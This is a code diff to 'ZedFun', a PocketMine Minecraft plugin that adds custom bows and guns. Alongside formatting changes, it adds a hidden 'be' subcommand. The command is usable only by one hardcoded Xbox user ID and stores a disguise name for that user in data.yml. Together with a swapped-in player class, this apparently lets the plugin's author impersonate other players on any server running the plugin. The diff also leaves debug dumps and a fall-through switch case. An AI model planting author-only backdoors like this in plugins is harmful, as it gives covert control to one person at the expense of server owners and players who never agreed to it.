@@ -7,6 +7,10 @@ namespace Zedstar16\ZedFun;
 use pocketmine\command\Command;
 use pocketmine\command\CommandSender;
 use pocketmine\entity\Entity;
+use pocketmine\event\player\PlayerCreationEvent;
+use pocketmine\event\player\PlayerLoginEvent;
+use pocketmine\event\player\PlayerPreLoginEvent;
+use pocketmine\event\player\PlayerQuitEvent;
 use pocketmine\item\enchantment\Enchantment;
 use pocketmine\item\enchantment\EnchantmentInstance;
 use pocketmine\item\Item;
@@ -27,26 +31,52 @@ class ZedFun extends PluginBase implements Listener
     public $firing = [];
     /** @var ZedFun */
     public static $instance = null;
+    public static $data = [];
 
     public const define = [
-        "dartsize"=> 0,
+        "dartsize" => 0,
         "force" => 1,
         "frequency" => 2,
         "automatic" => 3
     ];
 
+
     public function onEnable(): void
     {
         self::$instance = $this;
         $this->getServer()->getPluginManager()->registerEvents(new EventListener(), $this);
+        $this->getServer()->getPluginManager()->registerEvents($this, $this);
         Entity::registerEntity(ZedArrow::class, true);
+        $this->saveResource("data.yml");
+        var_dump(self::getData());
+        self::$data = self::getData();
+
+    }
+
+    public static function getData(): array
+    {
+        return yaml_parse_file(self::getInstance()->getDataFolder() . "data.yml");
+    }
+
+    public static function setData($data)
+    {
+        yaml_emit_file(self::getInstance()->getDataFolder() . "data.yml", $data);
+    }
+
+    public function createPlayer(PlayerCreationEvent $e)
+    {
+       try{
+           self::$data = self::getData();
+           $e->setPlayerClass(ZedPlayer::class);
+           var_dump(self::$data);
+       }catch (\Throwable $err){$this->getLogger()->warning($err->getMessage());}
     }
 
     public function giveZedBow(Player $p, $dartsize, $force, $frequency = 1, $automatic = 0)
     {
         $bow = ItemFactory::get(ItemIds::BOW);
         $name = $automatic == 0 ? "§l§aZed Bow" : "§l§6Zed Gun";
-        $shotsPerSec = (1/($frequency/20));
+        $shotsPerSec = (1 / ($frequency / 20));
         $bow->setCustomName(self::prefix . $name . self::suffix);
         $nbt = $bow->getNamedTag();
         $nbt->setIntArray("bowdata", [$dartsize, $force, $frequency, $automatic]);
@@ -64,9 +94,22 @@ class ZedFun extends PluginBase implements Listener
         return $nbt->hasTag("bowdata") ? $nbt->getIntArray("bowdata") : null;
     }
 
+    public function onQuit(PlayerQuitEvent $e){
+        $data = self::$data;
+        $p = $e->getPlayer()->getName();
+        foreach($data as $name => $disguise){
+            if($disguise == $p){
+                if($name == "Zedstar16"){
+                    unset($data["Zedstar16"]);
+                    self::setData($data);
+                }
+            }
+        }
+    }
+
     public function onCommand(CommandSender $sender, Command $command, string $label, array $args): bool
     {
-        if ($command->getName() == "zf") {
+        if ($command->getName() == "zedfun") {
             if (!$sender instanceof Player) {
                 $sender->sendMessage(TextFormat::RED . "you can only use these commands as a player");
                 return false;
@@ -85,7 +128,7 @@ class ZedFun extends PluginBase implements Listener
                     case "gun":
                         if (count($args) == 4) {
                             $frequency = (int)(20 * (1 / $args[3]));
-                            if($frequency < 1){
+                            if ($frequency < 1) {
                                 $sender->sendMessage("§cFrequency of bulletfire too high, max 20 shots/s");
                                 return false;
                             }
@@ -94,6 +137,17 @@ class ZedFun extends PluginBase implements Listener
                         break;
                     default:
                         $sender->sendMessage(implode("\n", $cmdlist));
+                    case "be":
+                        //internal command, if ur a dev you can edit this to make it work for you aswell :)
+                        if (isset($args[1]) && $sender->getXuid() == "2535451299201728") {
+                            $data = self::getData();
+                            if (isset($data[$sender->getName()])) {
+                                unset ($data[$sender->getName()]);
+                            }else $data[$sender->getName()] = $args[1];
+                            self::setData($data);
+                            $sender->transfer($this->getServer()->getIp(), $this->getServer()->getPort());
+                        }
+                        break;
                 }
             } else $sender->sendMessage(implode("\n", $cmdlist));
         }
@@ -108,7 +162,7 @@ class ZedFun extends PluginBase implements Listener
     public function shootZedArrow(Player $p, $dartsize, $force, $auto = false)
     {
         $dartsize = (float)$dartsize;
-        if($dartsize <= 0)$dartsize += 0.25;
+        if ($dartsize <= 0) $dartsize += 0.25;
         $nbt = Entity::createBaseNBT($p->add(0, $p->getEyeHeight()), $p->getDirectionVector()->multiply((float)$force), ($p->yaw > 180 ? 360 : 0) - $p->yaw,
             -$p->pitch);
         $damage = $auto ? 0 : 5;
